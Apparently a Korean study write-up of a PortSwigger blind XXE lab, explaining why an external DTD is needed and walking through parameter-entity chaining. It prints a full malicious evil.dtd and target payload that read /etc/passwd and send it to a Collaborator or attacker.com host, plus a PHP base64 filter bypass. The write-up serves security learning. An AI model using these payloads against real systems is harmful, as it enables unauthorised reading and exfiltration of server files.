# Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD

## 개요

- **난이도**: Practitioner
- **주제**: Blind XXE — 외부 DTD 로딩 / 파라미터 엔티티 체이닝 / OOB 데이터 탈취
- **링크**: https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration

## 목표

응답에 내용이 반영되지 않는 Blind XXE 환경에서, exploit 서버에 악성 외부 DTD 를 호스팅하고 파라미터 엔티티 체인으로 서버 로컬 파일(`/etc/passwd`) 내용을 Burp Collaborator 로 탈취한다.

## 004 랩과의 차이

```
[004 랩 — OOB 탐지만]
  %xxe; → 외부 서버로 HTTP 요청 발생 확인
  → 취약점 존재 여부만 확인
  → 파일 내용 탈취 없음

[005 랩 (이번) — OOB 데이터 탈취]
  %xxe; → 외부 DTD 로딩
  외부 DTD 안에서:
    %file; → 로컬 파일 읽기
    %send; → 파일 내용을 URL 에 담아 외부로 전송
  → 응답 없이도 파일 내용 탈취 완성
```

## 왜 외부 DTD 가 필요한가

### 내부 DTD 의 제약

```xml
<!-- 내부 DTD 에서 파라미터 엔티티 중첩 — 불가 -->
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % exfil "<!ENTITY &#x25; send SYSTEM 'http://외부/?x=%file;'>">
  %exfil;
  %send;
]>

문제:
  XML 스펙 상 내부 DTD 에서는 파라미터 엔티티를
  다른 엔티티 선언 내부에서 참조 불가
  → %file; 이 exfil 선언 내부에서 평가되지 않음
  → 파일 내용이 URL 에 삽입 안 됨
```

### 외부 DTD 의 자유

```
외부 DTD (별도 파일):
  내부 DTD 의 중첩 제약 없음
  파라미터 엔티티를 다른 선언 내부에서 자유롭게 참조 가능
  → %file; 이 %exfil; 선언 안에서 정상 평가
  → 파일 내용이 URL 에 삽입 → OOB 전송 성공

해결책:
  악성 파라미터 엔티티 체인을 외부 서버에 DTD 파일로 호스팅
  타겟 서버가 이 외부 DTD 를 로딩하도록 유도
```

## 공격 구조

### 1단계: 외부 DTD 파일 작성 (exploit 서버에 호스팅)

```xml
<!-- http://exploit-server.net/evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % exfil "<!ENTITY &#x25; send SYSTEM 'http://BURP-COLLABORATOR/?x=%file;'>">
%exfil;
%send;
```

### DTD 파일 각 라인 분석

```
<!ENTITY % file SYSTEM "file:///etc/passwd">
  → 파라미터 엔티티 file 정의
  → /etc/passwd 파일 내용을 값으로 가짐

<!ENTITY % exfil "<!ENTITY &#x25; send SYSTEM 'http://COLLAB/?x=%file;'>">
  → 파라미터 엔티티 exfil 정의
  → 값: send 엔티티 선언 문자열
  → &#x25; : % 의 XML 16진수 엔티티 인코딩
              (% 를 직접 쓰면 파라미터 엔티티 참조로 해석되어 오류)
  → %file; : file 엔티티 값(파일 내용)으로 치환

%exfil;
  → exfil 엔티티 평가
  → <!ENTITY % send SYSTEM 'http://COLLAB/?x=<파일내용>'> 가 DTD 에 선언됨

%send;
  → send 엔티티 평가
  → http://COLLAB/?x=root:x:0:0:root:...  HTTP 요청 발생
  → Collaborator 에서 URL 쿼리스트링으로 파일 내용 확인
```

### 2단계: 타겟으로 보내는 XXE 페이로드

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://exploit-server.net/evil.dtd">
  %xxe;
]>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

### 전체 실행 흐름

```
[타겟 서버]
  1. XML 파싱 시작
  2. DOCTYPE 블록: %xxe; 참조
     → http://exploit-server.net/evil.dtd 로드

[exploit 서버 → 외부 DTD 제공]
  3. evil.dtd 내용 파싱:
     %file;   정의 (파일 경로)
     %exfil;  평가 → send 엔티티 선언
     %send;   평가 → HTTP 요청 발생

[타겟 서버 → Burp Collaborator 요청]
  4. GET http://COLLABORATOR/?x=root:x:0:0:root:/root:/bin/bash
             daemon:x:1:1:...
     → 파일 내용이 URL 파라미터에 포함

[Burp Collaborator]
  5. HTTP 인터랙션 기록
     URL 의 x= 파라미터에서 /etc/passwd 내용 확인
```

### `&#x25;` — % 인코딩이 필요한 이유

```
문제 상황:
  <!ENTITY % exfil "<!ENTITY % send SYSTEM '...'>">
                             ↑
                 이 % 가 파라미터 엔티티 참조로 해석됨
                 → send 라는 엔티티를 참조하려 함
                 → 선언되지 않은 엔티티 → 오류

해결:
  % 를 XML 문자 참조로 표현:
    &#x25;  → 16진수 (0x25 = 37 = '%' ASCII)
    &#37;   → 10진수

  파서가 문자열 값을 처리할 때 &#x25; → % 로 치환
  → %send 가 아닌 % 문자 자체로 인식
  → exfil 평가 시점에 비로소 % send 로 조립
```

## 001~005 랩 Blind XXE 진화 과정

```
001 (파일 읽기, 응답 반영)
  → 응답 본문에 파일 내용 포함
  → 직접 확인 가능

002 (SSRF, 응답 반영)
  → 내부 서버 응답이 반영
  → 직접 확인 가능

003 (Blind OOB — 일반 엔티티)
  → 응답에 내용 없음
  → 외부 서버 요청으로 취약점 탐지

004 (Blind OOB — 파라미터 엔티티)
  → 일반 엔티티 차단 우회
  → 파라미터 엔티티로 OOB 탐지

005 (Blind OOB + 데이터 탈취) ← 이번
  → 파라미터 엔티티 체인 + 외부 DTD
  → Blind 환경에서도 파일 내용 탈취 완성
```

## 핵심 정리

- 내부 DTD 는 파라미터 엔티티 중첩에 제약이 있어 외부 DTD 파일로 악성 엔티티 체인을 분리 호스팅해야 한다.
- `%file;` → `%exfil;` → `%send;` 체인으로 파일 내용을 URL 쿼리스트링에 삽입해 OOB 전송한다.
- `&#x25;` 는 DTD 문자열 내부에서 `%` 를 리터럴 문자로 표현하는 방법으로, 파라미터 엔티티 참조와 구분하기 위해 필요하다.
- 응답 반영이 없는 완전한 Blind 환경에서도 외부 DTD + 파라미터 엔티티 체이닝으로 데이터 탈취가 가능하다.

## 배운 점 및 추가 학습

### 1. 파라미터 엔티티 체이닝 구조 요약

```
외부 DTD 에서만 동작하는 패턴:

단계 1 — 파일 정의:
  <!ENTITY % file SYSTEM "file:///etc/passwd">

단계 2 — 동적 엔티티 선언 (파일 내용 삽입):
  <!ENTITY % exfil
    "<!ENTITY &#x25; send
       SYSTEM 'http://attacker.com/?x=%file;'>"
  >

단계 3 — 선언 평가:
  %exfil;
  → send 엔티티가 파일 내용을 URL 에 담아 선언됨

단계 4 — 요청 발생:
  %send;
  → HTTP GET http://attacker.com/?x=<파일내용>
```

### 2. 탈취 가능한 파일 유형 제약

```
단일 라인 파일 → 탈취 용이:
  /etc/hostname
  /etc/os-release

멀티 라인 파일 → 줄바꿈 문제:
  /etc/passwd
  → URL 에 개행 포함 시 HTTP 요청이 잘릴 수 있음
  → 일부 파서는 개행을 URL 로 인식해 잘라냄
  → Base64 인코딩 우회 기법 필요 (PHP 필터 등)

PHP 필터로 인코딩:
  file:///etc/passwd → php://filter/convert.base64-encode/resource=/etc/passwd
  → Base64 단일 라인 → URL 에 안전하게 포함
```

### 3. 005 랩까지 XXE 기법 종합

| 랩 | 응답 반영 | 엔티티 유형 | 외부 DTD | 데이터 탈취 |
|----|-----------|------------|---------|------------|
| 001 | O | 일반 (file://) | X | 응답에서 직접 |
| 002 | O | 일반 (http://) | X | 응답에서 직접 |
| 003 | X (Blind) | 일반 | X | OOB 탐지만 |
| 004 | X (Blind) | 파라미터 | X | OOB 탐지만 |
| 005 | X (Blind) | 파라미터 체인 | O | OOB 탈취 |
